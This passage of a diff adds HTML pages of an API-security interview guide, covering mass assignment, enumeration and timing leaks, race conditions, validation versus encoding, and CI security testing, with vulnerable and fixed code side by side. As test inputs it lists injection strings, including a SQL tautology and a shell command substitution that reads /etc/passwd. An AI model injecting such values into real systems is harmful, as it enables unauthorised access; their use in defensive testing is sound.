+      framework's safety or use a framework without it (many Node.js ORMs) reintroduce the bug.</p>
+
+      <h4>The testing discipline</h4>
+      <p>Every endpoint that accepts a request body or returns a resource should have tests that verify:</p>
+      <ul>
+        <li><strong>A protected field cannot be set.</strong> Sending <code>{"is_admin": true}</code> is
+        either rejected or ignored, not applied.</li>
+        <li><strong>A sensitive field is not in the response.</strong> The response does not contain
+        <code>password_hash</code>, <code>ssn</code>, <code>internal_notes</code>.</li>
+        <li><strong>Only expected fields are returned.</strong> A response schema validation rejects any
+        unexpected field.</li>
+      </ul>
+      <p>These tests are cheap to write and catch the most common API3 vulnerability before it reaches
+      production.</p>
+
+      <div class="callout pitfall">
+        <span class="label">Common Pitfall</span>
+        <p>Using a library that "automatically" maps the request to the model (a serialization framework, an
+        ORM's create-from-body helper) without checking what it maps. The library may include fields the
+        developer did not intend — the field exists on the model, so it is set. The fix: never rely on the
+        library's default; define the DTO and copy the fields explicitly.</p>
+      </div>
+
+      <div class="callout tip">
+        <span class="label">Interview Framing</span>
+        <p>Say: "Mass assignment is write-side — the client sets fields they should not. Excessive exposure is
+        read-side — the response includes fields they should not see. Both are API3, and both are fixed by an
+        explicit DTO on the boundary — never the ORM entity, never <code>req.body</code>." That covers the two
+        sides and the single fix.</p>
+      </div>
+    </div>
+  </article>
+
+  <!-- Q7 -->
+  <article class="q teal" id="q7">
+    <div class="q-head">
+      <div class="q-num">7</div>
+      <h3>What is enumeration, and how do you prevent information disclosure in error responses and timing?</h3>
+    </div>
+    <div class="q-body">
+      <div class="callout answer">
+        <span class="label">Short Answer</span>
+        <p>Enumeration is the attack where the response (or its timing, or its size) reveals whether an object
+        exists, whether a user is registered, whether a token is valid. Each response leaks one bit of
+        information; enough responses reconstruct the full dataset. The defenses: <strong>generic responses
+        for missing resources</strong>, <strong>constant-time operations</strong> for security-sensitive
+        comparisons, <strong>uniform error timing</strong>, <strong>rate limiting</strong> on enumeration-prone
+        endpoints, and <strong>authenticated lookups</strong> that require a known identifier rather than
+        accepting a guess.</p>
+      </div>
+
+      <h4>What enumeration reveals</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Endpoint</th><th>What it leaks</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>POST /signup</code></td>
+              <td>"Email already registered" confirms the email exists — a registration oracle</td>
+            </tr>
+            <tr>
+              <td><code>POST /login</code></td>
+              <td>Different errors for "user not found" vs "wrong password" — a user-existence oracle</td>
+            </tr>
+            <tr>
+              <td><code>GET /users/42</code></td>
+              <td>404 for missing, 200 for existing, 403 for existing but forbidden — the difference reveals existence</td>
+            </tr>
+            <tr>
+              <td><code>POST /password-reset</code></td>
+              <td>"No account with that email" vs "Email sent" — an account-existence oracle</td>
+            </tr>
+            <tr>
+              <td><code>GET /resources?q=...</code></td>
+              <td>Different response times for existing vs nonexistent queries — a search oracle</td>
+            </tr>
+            <tr>
+              <td><code>GET /api-keys/{key}</code></td>
+              <td>Different errors for "invalid" vs "expired" — a token-validity oracle</td>
+            </tr>
+            <tr>
+              <td><code>PUT /orders/42</code></td>
+              <td>404 vs 403 — reveals which order IDs exist (and BOLA)</td>
+            </tr>
+            <tr>
+              <td><code>GET /invitations/{token}</code></td>
+              <td>Different responses for valid vs invalid tokens — a token-guessing oracle</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The cumulative effect: an attacker enumerates emails (via signup), then users (via login), then
+      resources (via 404 vs 403), then tokens (via response differences). Each endpoint adds to the map; the
+      attacker now knows the shape of the data.</p>
+
+      <h4>The classic fixes</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Endpoint</th><th>Vulnerable response</th><th>Fixed response</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>POST /signup</code></td>
+              <td>"Email already registered"</td>
+              <td>Generic: "If this email is available, you'll receive a confirmation email" (and send an email either way — a "this address is registered" notification, which is safe because it is out-of-band)</td>
+            </tr>
+            <tr>
+              <td><code>POST /login</code></td>
+              <td>"User not found" / "Wrong password"</td>
+              <td>Generic: "Invalid credentials" for both</td>
+            </tr>
+            <tr>
+              <td><code>POST /password-reset</code></td>
+              <td>"No account with that email"</td>
+              <td>Generic: "If the account exists, a reset link has been sent" (send the email only if it exists, but the response is the same)</td>
+            </tr>
+            <tr>
+              <td><code>GET /users/42</code></td>
+              <td>404 for missing, 403 for forbidden</td>
+              <td>404 for both — hide existence (Volume 6, Question 1)</td>
+            </tr>
+            <tr>
+              <td><code>GET /invitations/{token}</code></td>
+              <td>404 / 403 / 200 — three outcomes</td>
+              <td>404 for all invalid tokens (including expired, revoked, never existed)</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The pattern: <strong>do not reveal whether an object exists unless the caller is authorized to
+      know</strong>. The generic response is uninformative to the legitimate user (who can still recover via
+      out-of-band email) and equally uninformative to the attacker.</p>
+
+      <h4>The timing side-channel</h4>
+      <p>Even with generic messages, the response time can leak. The classic case: a login with a nonexistent
+      email returns in 10 ms (no password hash to compute), while a login with a real email returns in 110 ms
+      (the bcrypt hash takes 100 ms). The attacker measures the time and knows the email exists.</p>
+      <p>The fix: perform the expensive operation even for nonexistent users. The classic implementation:
+      compare the password against a dummy hash for a nonexistent user, so the time is the same. The attack
+      is defeated because both paths take the same time.</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Vulnerable</th><th>Fixed</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>
+                <pre>user = db.find(email)
+if not user:
+    return "Invalid"
+if bcrypt.hash(password) != user.hash:
+    return "Invalid"
+return "OK"</pre>
+              </td>
+              <td>
+                <pre>user = db.find(email)
+if not user:
+    bcrypt.hash(password, DUMMY_HASH)  # same cost
+    return "Invalid"
+if bcrypt.hash(password) != user.hash:
+    return "Invalid"
+return "OK"</pre>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The dummy hash makes both paths take the same time. The response is still "Invalid" in both cases, but
+      the timing no longer distinguishes them.</p>
+
+      <h4>The constant-time comparison</h4>
+      <p>For security-sensitive comparisons — tokens, HMACs, API keys — the comparison must take the same time
+      regardless of where the first mismatch is. A naive string comparison (<code>a == b</code>) short-circuits
+      at the first difference, so an attacker who knows the prefix can measure how many bytes match and build
+      the token one byte at a time.</p>
+      <p>The fix: constant-time comparison functions — <code>hmac.compare_digest</code> in Python,
+      <code>crypto.timingSafeEqual</code> in Node.js, <code>MessageDigest.isEqual</code> in Java. These compare
+      every byte regardless, so the timing is uniform.</p>
+
+      <h4>The "enumerate the ID space" attack</h4>
+      <p>Even with generic 404s, an attacker who knows the ID format can enumerate the space. Sequential IDs
+      (<code>/users/1</code>, <code>/users/2</code>, ...) are guessable. The defenses:</p>
+      <ul>
+        <li><strong>Non-sequential IDs</strong> — UUIDs, ULIDs, or opaque tokens. The space is too large to
+        enumerate; the attacker cannot guess.</li>
+        <li><strong>Rate limiting</strong> — even with non-sequential IDs, a high request rate suggests an
+        attack; the limiter slows it down.</li>
+        <li><strong>Authenticated lookups</strong> — the endpoint requires a valid token, so the attacker needs
+        an account for each enumeration (and the account itself is rate-limited).</li>
+        <li><strong>Audit logging and alerting</strong> — a spike in 404s from one client is an enumeration
+        attempt; alert on it.</li>
+      </ul>
+
+      <h4>The information-disclosure beyond enumeration</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Leak</th><th>Example</th><th>Fix</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Stack traces</strong></td>
+              <td>A 500 with a full stack trace in production</td>
+              <td>Generic error body; log the trace server-side</td>
+            </tr>
+            <tr>
+              <td><strong>Database errors</strong></td>
+              <td>"Duplicate entry 'alice@x.com' for key 'email'"</td>
+              <td>Map to a generic "conflict" error</td>
+            </tr>
+            <tr>
+              <td><strong>Framework version</strong></td>
+              <td><code>X-Powered-By: Express</code> or a version in the server banner</td>
+              <td>Strip the headers; generic server banners</td>
+            </tr>
+            <tr>
+              <td><strong>Internal IPs / hostnames</strong></td>
+              <td>An error that reveals <code>db-internal.local:5432</code></td>
+              <td>Sanitise error messages</td>
+            </tr>
+            <tr>
+              <td><strong>Source code paths</strong></td>
+              <td><code>/app/src/controllers/user.js:42</code></td>
+              <td>Sanitise stack traces; do not return them</td>
+            </tr>
+            <tr>
+              <td><strong>Configuration values</strong></td>
+              <td>A debug endpoint that dumps env vars</td>
+              <td>No debug endpoints in production; sanitised error responses</td>
+            </tr>
+            <tr>
+              <td><strong>Feature flags</strong></td>
+              <td>A response that reveals unreleased features by their presence or absence</td>
+              <td>Do not expose internal flags; only expose the resulting behaviour</td>
+            </tr>
+            <tr>
+              <td><strong>API keys / tokens in logs</strong></td>
+              <td>An access log that includes the full <code>Authorization</code> header</td>
+              <td>Redact sensitive headers in logs; audit log configuration</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>The CORS and header leakage</h4>
+      <p>Some headers leak more than they should:</p>
+      <ul>
+        <li><strong>Server and X-Powered-By</strong> — reveal framework and version; strip them.</li>
+        <li><strong>X-Debug-*</strong> — if any such header is present, the response may contain debug info;
+        remove in production.</li>
+        <li><strong>Access-Control-Allow-Origin: *</strong> with credentials — this is both a misconfiguration
+        and an information leak (the response is readable from any origin).</li>
+        <li><strong>Vary: Cookie / Vary: Authorization</strong> — if present, tells the attacker the response
+        varies by these; not a leak per se, but useful reconnaissance.</li>
+      </ul>
+
+      <h4>The unified error body</h4>
+      <p>The cleanest defense against information disclosure is a single error response shape — RFC 7807
+      (Volume 8, Question 5) — with:</p>
+      <ul>
+        <li>A generic message for the client (no stack trace, no SQL, no internal paths).</li>
+        <li>A correlation ID for support (the client can report it, the developer can find the log entry).</li>
+        <li>A stable error code for the client's logic (not the exception class name).</li>
+      </ul>
+      <p>The full error — the stack trace, the internal state, the exception message — is logged server-side
+      with the same correlation ID. The client sees the sanitised version; the developer sees the full version;
+      the two are linked by the ID.</p>
+
+      <div class="callout pitfall">
+        <span class="label">Common Pitfall</span>
+        <p>Returning 404 for missing resources but 403 for forbidden ones. The distinction is helpful for
+        legitimate users, but it is an enumeration oracle — the attacker learns which IDs exist. For sensitive
+        resources, return 404 for both (hide existence) and log the 403 internally.</p>
+      </div>
+
+      <div class="callout tip">
+        <span class="label">Interview Framing</span>
+        <p>Say: "Enumeration is the response revealing existence — through the message, the status code, the
+        timing, or the body. The fix is generic responses, constant-time comparisons, dummy work for
+        nonexistent users, non-sequential IDs, and rate limiting. And sanitise every error response — stack
+        traces and internal paths belong in logs, not in the response." That covers the mechanisms and the
+        defenses.</p>
+      </div>
+    </div>
+  </article>
+
+  <!-- Q8 -->
+  <article class="q teal" id="q8">
+    <div class="q-head">
+      <div class="q-num">8</div>
+      <h3>What are race conditions in API design, and how do you prevent them?</h3>
+    </div>
+    <div class="q-body">
+      <div class="callout answer">
+        <span class="label">Short Answer</span>
+        <p>A race condition occurs when two concurrent requests interleave in a way that produces an incorrect
+        result — a double charge, an oversold inventory, a duplicate account. The class of bug is called
+        <strong>TOCTOU</strong> (Time of Check to Time of Use): the code checks a condition, then acts on it,
+        and the state changed between the two. The defense: <strong>atomic operations</strong> (compare-and-set,
+        database constraints), <strong>locks and transactions</strong> (with the right isolation level), and
+        <strong>idempotency keys</strong> for the operations that must not duplicate.</p>
+      </div>
+
+      <h4>The classic race conditions</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Scenario</th><th>The race</th><th>The impact</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Double-spend</strong></td>
+              <td>Two requests check the balance ($100), both see it, both debit $100 — balance goes to -$100</td>
+              <td>Money created from nothing</td>
+            </tr>
+            <tr>
+              <td><strong>Oversold inventory</strong></td>
+              <td>Two requests check the stock (1 item), both see it available, both decrement — stock goes to -1</td>
+              <td>Orders that cannot be fulfilled</td>
+            </tr>
+            <tr>
+              <td><strong>Duplicate account</strong></td>
+              <td>Two signup requests check "email available", both pass, both insert — two accounts with the same email</td>
+              <td>Login ambiguity, security confusion</td>
+            </tr>
+            <tr>
+              <td><strong>Coupon abuse</strong></td>
+              <td>Two requests check "coupon not used", both redeem — coupon used twice</td>
+              <td>Discount fraud</td>
+            </tr>
+            <tr>
+              <td><strong>Auction sniping</strong></td>
+              <td>Two bids at the last millisecond; both are accepted; the auction ends with two winners</td>
+              <td>Legal dispute</td>
+            </tr>
+            <tr>
+              <td><strong>Withdrawal duplication</strong></td>
+              <td>The client retries after timeout; the original request succeeded; both are processed</td>
+              <td>Double withdrawal (Volume 5, Question 1)</td>
+            </tr>
+            <tr>
+              <td><strong>Permission escalation</strong></td>
+              <td>Two requests: one checks "user is not admin", the other adds the admin role; the first completes after the second</td>
+              <td>Unauthorized action</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>Why it happens</h4>
+      <p>The root cause is always the same: <strong>check-then-act is not atomic</strong>. The code:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Vulnerable code</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>
+                <pre>balance = db.get_balance(account)
+if balance >= amount:
+    db.set_balance(account, balance - amount)
+    db.insert_withdrawal(account, amount)</pre>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>Between the <code>get_balance</code> and the <code>set_balance</code>, another request can run the same
+      code and read the same balance. Both proceed; both write; the second write overwrites the first (or the
+      balance goes negative, depending on the write).</p>
+
+      <h4>The defenses</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Defense</th><th>How</th><th>Use case</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Atomic operations</strong></td>
+              <td><code>UPDATE accounts SET balance = balance - 100 WHERE balance >= 100</code> — the check and
+              the write are one operation</td>
+              <td>The database does the check atomically</td>
+            </tr>
+            <tr>
+              <td><strong>Unique constraints</strong></td>
+              <td>The database rejects the second insert (<code>UNIQUE(email)</code>)</td>
+              <td>Duplicate signup, duplicate coupon</td>
+            </tr>
+            <tr>
+              <td><strong>Conditional updates (compare-and-set)</strong></td>
+              <td><code>UPDATE ... SET version = version + 1 WHERE id = ? AND version = ?</code> — if the
+              version changed, no rows are affected</td>
+              <td>Optimistic concurrency (Volume 5, Question 9)</td>
+            </tr>
+            <tr>
+              <td><strong>Pessimistic locking</strong></td>
+              <td><code>SELECT ... FOR UPDATE</code> — the row is locked; another transaction waits</td>
+              <td>High-conflict rows (auction bid, seat booking)</td>
+            </tr>
+            <tr>
+              <td><strong>Serializable transactions</strong></td>
+              <td>The database detects the conflict and one transaction is aborted</td>
+              <td>Complex transactions that cannot be expressed as one statement</td>
+            </tr>
+            <tr>
+              <td><strong>Distributed locks</strong></td>
+              <td>A lock service (Redis, etcd) ensures only one request proceeds</td>
+              <td>Cross-service operations (Volume 6, Question 9)</td>
+            </tr>
+            <tr>
+              <td><strong>Idempotency keys</strong></td>
+              <td>The second request with the same key returns the first's result, not a new operation</td>
+              <td>Retries and client-side duplicates (Volume 5, Question 2)</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>The atomic SQL operation</h4>
+      <p>The cleanest fix for the balance race is to move the check into the SQL statement:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Vulnerable</th><th>Fixed</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>
+                <pre>balance = SELECT balance FROM accounts WHERE id = ?
+if balance >= 100:
+    UPDATE accounts SET balance = balance - 100</pre>
+              </td>
+              <td>
+                <pre>UPDATE accounts SET balance = balance - 100
+WHERE id = ? AND balance >= 100
+# if rows affected = 0, insufficient balance</pre>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The database performs the check and the decrement atomically — no window between them. If the balance
+      is 50 and the request tries to debit 100, the <code>WHERE</code> clause fails; the update affects 0
+      rows; the application knows the debit was rejected.</p>
+
+      <h4>The idempotency key for retries</h4>
+      <p>A client-side race is subtler. The client sends a payment request; the request times out; the client
+      retries. The first request succeeded; the second is a duplicate. Only an idempotency key (Volume 5)
+      solves this — the server stores the key and the result; the retry with the same key returns the stored
+      result, not a new operation.</p>
+      <p>Without the key, the server cannot distinguish "the client retried because it did not get the
+      response" from "the client deliberately made two requests". The key is the client's declaration that
+      these two requests are the same logical operation.</p>
+
+      <h4>The distributed race</h4>
+      <p>When two services operate on shared state, the atomic operation is not enough — the database is shared,
+      but the check-and-act may span services. The patterns:</p>
+      <ul>
+        <li><strong>Single service owns the state</strong> — only one service can modify the balance; the others
+        call it. The atomic operation is inside that service.</li>
+        <li><strong>Distributed lock</strong> — a lock service ensures only one operation proceeds. The lock
+        must have a TTL (crash recovery) and a fencing token (stale lock protection) — Volume 6, Question 9.</li>
+        <li><strong>Saga with compensation</strong> — the operation is a sequence of steps; each step is
+        reversible; a conflict triggers a compensating step (Volume 5 of the distributed systems series).</li>
+      </ul>
+
+      <h4>The user-facing race</h4>
+      <p>Not every race is a security bug — some are UX bugs. A user double-clicks "Submit" and two orders are
+      created. The fix: <strong>disable the button after click</strong> (frontend), <strong>idempotency
+      key</strong> (backend), and <strong>unique constraints</strong> where applicable. The frontend is a
+      mitigation, not a fix — the backend must be safe regardless.</p>
+
+      <h4>The race-condition test</h4>
+      <p>Race conditions are hard to test because they are timing-dependent. The approaches:</p>
+      <ul>
+        <li><strong>Concurrent test</strong> — send N parallel requests to the same endpoint; verify that only
+        one succeeds and the rest get a clear error.</li>
+        <li><strong>Chaos testing</strong> — inject delays at the database layer; the race window widens; the
+        bug appears.</li>
+        <li><strong>Formal verification</strong> — for critical financial operations, model the state machine
+        and verify the invariants.</li>
+        <li><strong>Load testing at scale</strong> — the race appears under high concurrency, even if it does
+        not appear in single-user tests.</li>
+      </ul>
+
+      <h4>The "it hasn't happened yet" trap</h4>
+      <p>A race condition that has not occurred in testing is not absent — it is timing-dependent. A flash sale
+      triggers it; a retry storm triggers it; a slow network triggers it. The race is present; the conditions
+      are not. The defense is design: make the operation atomic by construction, not by testing.</p>
+
+      <div class="callout pitfall">
+        <span class="label">Common Pitfall</span>
+        <p>Relying on the application-level lock (a mutex, a semaphore). In a single-process app, this works. In
+        a multi-instance deployment, each instance has its own lock — two instances run the same operation
+        concurrently. The fix: the database constraint or a distributed lock; application-level locks are
+        single-process only.</p>
+      </div>
+
+      <div class="callout tip">
+        <span class="label">Interview Framing</span>
+        <p>Say: "Race conditions are TOCTOU — check-then-act is not atomic. The fixes are atomic SQL operations
+        (check in the WHERE clause), unique constraints, compare-and-set with version, pessimistic locks for
+        high-conflict rows, and idempotency keys for retries. Never rely on application-level locks in a
+        distributed system." That covers the mechanism and the defenses.</p>
+      </div>
+    </div>
+  </article>
+
+  <!-- Q9 -->
+  <article class="q teal" id="q9">
+    <div class="q-head">
+      <div class="q-num">9</div>
+      <h3>What is the input validation and output encoding discipline, and why is it not the same as security?</h3>
+    </div>
+    <div class="q-body">
+      <div class="callout answer">
+        <span class="label">Short Answer</span>
+        <p>Input validation is checking that the input has the expected shape, type, range, and format — before
+        using it. Output encoding is transforming the output for its destination — HTML-encoding for a web
+        page, SQL-escaping for a database, JSON-encoding for a JSON response. Both are necessary and neither is
+        sufficient. <strong>Validation is an allowlist of the expected</strong>; <strong>encoding is the escape
+        for the destination</strong>. The mistake is thinking that one substitutes for the other, or that
+        validation means the input is "safe".</p>
+      </div>
+
+      <h4>Input validation — what it actually is</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Layer</th><th>What it checks</th><th>Example</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Syntactic</strong></td>
+              <td>Is the JSON valid? Are the types correct? Are required fields present?</td>
+              <td><code>email</code> must be a string; <code>age</code> must be an integer; <code>id</code> is required</td>
+            </tr>
+            <tr>
+              <td><strong>Semantic</strong></td>
+              <td>Does the value make sense? Is it in the allowed set? Is it in range?</td>
+              <td><code>age</code> must be 0–150; <code>country</code> must be an ISO code; <code>amount</code>
+              must be positive</td>
+            </tr>
+            <tr>
+              <td><strong>Business</strong></td>
+              <td>Is the value allowed by the business rules?</td>
+              <td>The user cannot order more than 10 of this item; the coupon is not expired</td>
+            </tr>
+            <tr>
+              <td><strong>Authorization</strong></td>
+              <td>Is the user allowed to set this field? (Mass assignment — Question 6)</td>
+              <td><code>is_admin</code> is not in the allowed-fields list</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The allowlist principle: validation should describe what is <em>allowed</em>, not what is
+      <em>forbidden</em>. "Reject values containing <code>&lt;script&gt;</code>" is a denylist — trivially
+      bypassed by <code>&lt;SCRIPT&gt;</code>, <code>&lt;scr&lt;script&gt;ipt&gt;</code>, or an
+      encoding the filter does not know. "Accept only lowercase letters, digits, and hyphens, max 50
+      characters" is an allowlist — the attack surface is closed.</p>
+
+      <h4>Output encoding — what it actually is</h4>
+      <p>Encoding is transforming data for its destination, so that the destination treats it as data, not as
+      code:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Destination</th><th>Encoding</th><th>Example</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>HTML body</td>
+              <td>HTML entity encoding</td>
+              <td><code>&lt;</code> → <code>&amp;lt;</code>; <code>"</code> → <code>&amp;quot;</code></td>
+            </tr>
+            <tr>
+              <td>HTML attribute</td>
+              <td>Attribute encoding (includes quotes)</td>
+              <td><code>"</code> → <code>&amp;quot;</code>; single-quote → <code>&amp;#x27;</code></td>
+            </tr>
+            <tr>
+              <td>JavaScript</td>
+              <td>JS encoding (hex/unicode escapes)</td>
+              <td><code>alert</code> → <code>\u0061lert</code></td>
+            </tr>
+            <tr>
+              <td>URL</td>
+              <td>Percent-encoding</td>
+              <td>space → <code>%20</code>; <code>/</code> → <code>%2F</code> in query values</td>
+            </tr>
+            <tr>
+              <td>SQL</td>
+              <td>Parameterisation (not encoding)</td>
+              <td>Send values separately from the query</td>
+            </tr>
+            <tr>
+              <td>Shell</td>
+              <td>Argument array (not encoding)</td>
+              <td>Pass args as a list, not a concatenated string</td>
+            </tr>
+            <tr>
+              <td>JSON</td>
+              <td>JSON serialization</td>
+              <td>String values are quoted and escaped by the JSON encoder</td>
+            </tr>
+            <tr>
+              <td>XML</td>
+              <td>XML entity encoding</td>
+              <td><code>&lt;</code> → <code>&amp;lt;</code>; <code>&amp;</code> → <code>&amp;amp;</code></td>
+            </tr>
+            <tr>
+              <td>CSS</td>
+              <td>CSS encoding</td>
+              <td>Escape special characters as <code>\XXXX</code></td>
+            </tr>
+            <tr>
+              <td>LDAP</td>
+              <td>LDAP escaping</td>
+              <td>Escape <code>*()\</code>, NUL</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The key insight: <strong>encoding is context-specific</strong>. The same input, rendered in HTML and
+      in JavaScript, needs different encoding. A string that is safe in an HTML body may be dangerous in an
+      HTML attribute (the quote breaks out); a string that is safe in a JSON value may be dangerous in a URL.
+      The encoder must know the destination.</p>
+
+      <h4>Validation vs encoding — the difference</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Aspect</th><th>Validation</th><th>Encoding</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>Purpose</td>
+              <td>Reject unexpected input</td>
+              <td>Make expected input safe for the destination</td>
+            </tr>
+            <tr>
+              <td>Applied to</td>
+              <td>The input, on arrival</td>
+              <td>The output, on rendering</td>
+            </tr>
+            <tr>
+              <td>Failure mode</td>
+              <td>Reject the request (400)</td>
+              <td>The value is displayed literally, not interpreted</td>
+            </tr>
+            <tr>
+              <td>Against injection</td>
+              <td>Supplementary — can catch obvious attacks</td>
+              <td>Definitive — the correct defense</td>
+            </tr>
+            <tr>
+              <td>Against bad data</td>
+              <td>Definitive — the data is rejected</td>
+              <td>Supplementary — encoding does not fix bad data</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>The "validation means safe" trap</h4>
+      <p>A common mistake: "we validate the input, so we do not need to encode the output". The reasoning is
+      wrong because:</p>
+      <ul>
+        <li><strong>Validation can be bypassed</strong> — a denylist is trivially bypassed; an allowlist that is
+        too permissive (allowing <code>&lt;</code> in a name) allows the attack.</li>
+        <li><strong>Validation cannot know the destination</strong> — the same input is rendered in five
+        different contexts; the validation does not know which one.</li>
+        <li><strong>Validation is applied at a different time</strong> — the input is validated on arrival, but
+        the rendering context is known at output time.</li>
+        <li><strong>The database is a storage, not a validator</strong> — a value stored via one path may be
+        rendered via another, and the validation of the first path does not help the second.</li>
+      </ul>
+      <p>The correct principle: <strong>validate on input, encode on output, and do not let one substitute for
+      the other</strong>. Both are necessary; neither is sufficient.</p>
+
+      <h4>The framework as the encoder</h4>
+      <p>Modern frameworks encode output by default:</p>
+      <ul>
+        <li><strong>React</strong> — JSX escapes string interpolation by default; <code>dangerouslySetInnerHTML</code>
+        is required to bypass.</li>
+        <li><strong>Django templates</strong> — auto-escape on; <code>|safe</code> or <code>mark_safe</code>
+        is required to bypass.</li>
+        <li><strong>Jinja2</strong> — auto-escape on for HTML templates; <code>|safe</code> to bypass.</li>
+        <li><strong>Thymeleaf</strong> — auto-escape on for HTML; <code>th:utext</code> to bypass.</li>
+        <li><strong>Go templates</strong> — auto-escape by default; <code>template.HTML</code> to bypass.</li>
+      </ul>
+      <p>The discipline: do not bypass the framework's encoder. The <code>|safe</code> and
+      <code>dangerouslySetInnerHTML</code> escape hatches exist for cases where the developer knows the content
+      is safe (a trusted HTML fragment), but they are the exact places where XSS happens. Every use of a
+      bypass should be reviewed.</p>
+
+      <h4>The library for the domain</h4>
+      <p>For specific contexts, use a library that does the encoding correctly:</p>
+      <ul>
+        <li><strong>HTML sanitisation</strong> — DOMPurify, OWASP Java HTML Sanitizer, Bleach — for HTML that
+        the user genuinely needs to include (rich text editor output).</li>
+        <li><strong>Markdown rendering</strong> — a library that sanitises the HTML output of the Markdown.</li>
+        <li><strong>URL construction</strong> — a URL builder that percent-encodes the components.</li>
+        <li><strong>SQL</strong> — the parameterised query API of the driver (never a manual escape).</li>
+        <li><strong>Shell</strong> — the argument-array API of the subprocess module (never shell=True).</li>
+      </ul>
+      <p>The library is not a substitute for understanding the context — but it is a substitute for writing
+      the encoding by hand, which is where the bugs live.</p>
+
+      <h4>The comprehensive validation strategy</h4>
+      <ol>
+        <li><strong>Validate the schema</strong> — the request has the right shape (JSON Schema, OpenAPI schema,
+        a validation library).</li>
+        <li><strong>Validate the types</strong> — each field is the right type (string, integer, boolean, date).</li>
+        <li><strong>Validate the range</strong> — each value is within its allowed bounds (length, numeric range,
+        enum values).</li>
+        <li><strong>Validate the business rules</strong> — the request is allowed by the domain (coupon not
+        expired, user has enough balance).</li>
+        <li><strong>Encode for the destination</strong> — HTML, SQL, JSON, XML, shell, URL — at the point of use,
+        with the correct library.</li>
+        <li><strong>Test with malicious input</strong> — the tests include <code>&lt;script&gt;</code>,
+        <code>' OR '1'='1</code>, <code>$(cat /etc/passwd)</code>, and verify the output is safe.</li>
+      </ol>
+
+      <div class="callout pitfall">
+        <span class="label">Common Pitfall</span>
+        <p>Validating the input but storing the original (unencoded) value, then rendering it in a template.
+        The validation passed — the input is a valid string — but the rendering context (HTML) requires
+        encoding, and the stored value has no encoding. The fix: encode at the output, not at the input; and
+        use the framework's encoder, not a manual escape.</p>
+      </div>
+
+      <div class="callout tip">
+        <span class="label">Interview Framing</span>
+        <p>Say: "Validate on input, encode on output, and do not let one substitute for the other. Validation is
+        an allowlist; encoding is context-specific — HTML needs HTML encoding, SQL needs parameterisation, shell
+        needs argument arrays. The framework's encoder is the default; the bypass is the exception, and every
+        bypass is reviewed." That covers the discipline and the trap.</p>
+      </div>
+    </div>
+  </article>
+
+  <!-- Q10 -->
+  <article class="q teal" id="q10">
+    <div class="q-head">
+      <div class="q-num">10</div>
+      <h3>How do you test an API for security in CI — SAST, DAST, fuzzing, dependency scanning?</h3>
+    </div>
+    <div class="q-body">
+      <div class="callout answer">
+        <span class="label">Short Answer</span>
+        <p>Security testing in CI has four complementary layers: <strong>SAST</strong> (static analysis —
+        scans the code for known patterns, no running app), <strong>DAST</strong> (dynamic analysis — scans
+        the running app for vulnerabilities, sends attack payloads), <strong>dependency scanning</strong>
+        (checks third-party libraries against known CVEs), and <strong>fuzzing</strong> (generates random input
+        and looks for crashes). Each catches a different class; none catches everything; together they form
+        the baseline. On top of these, <strong>contract tests</strong> for the API and <strong>security
+        integration tests</strong> for the critical flows (auth, authorization, payment) are the specific
+        tests that catch the specific bugs.</p>
+      </div>
+
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Layer</th><th>Catches</th><th>Misses</th><th>Tools</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>SAST</strong></td>
+              <td>Known patterns in code — SQL concatenation, hardcoded secrets, missing auth middleware,
+              dangerous APIs</td>
+              <td>Logic bugs, configuration, runtime behaviour, third-party vulnerabilities</td>
+              <td>Semgrep, SonarQube, CodeQL, Snyk Code, Bandit (Python), gosec (Go)</td>
+            </tr>
+            <tr>
+              <td><strong>DAST</strong></td>
+              <td>Runtime vulnerabilities — injection, XSS, auth bypass, misconfiguration, missing headers</td>
+              <td>Code-level issues, business logic, deep authorization</td>
+              <td>OWASP ZAP, Burp Suite (Pro), Nuclei, Nikto</td>
+            </tr>
+            <tr>
+              <td><strong>Dependency scanning</strong></td>
+              <td>Known CVEs in third-party libraries</td>
+              <td>Vulnerabilities in application code, zero-days, transitive dependency issues</td>
+              <td>Dependabot, Snyk Open Source, OWASP Dependency-Check, Trivy, Grype</td>
+            </tr>
+            <tr>
+              <td><strong>Fuzzing</strong></td>
+              <td>Crashes, hangs, memory bugs, unhandled exceptions on malformed input</td>
+              <td>Logic bugs, authorization, injection (unless the payload is in the corpus)</td>
+              <td>AFL++, libFuzzer, Hypothesis (property-based), go-fuzz</td>
+            </tr>
+            <tr>
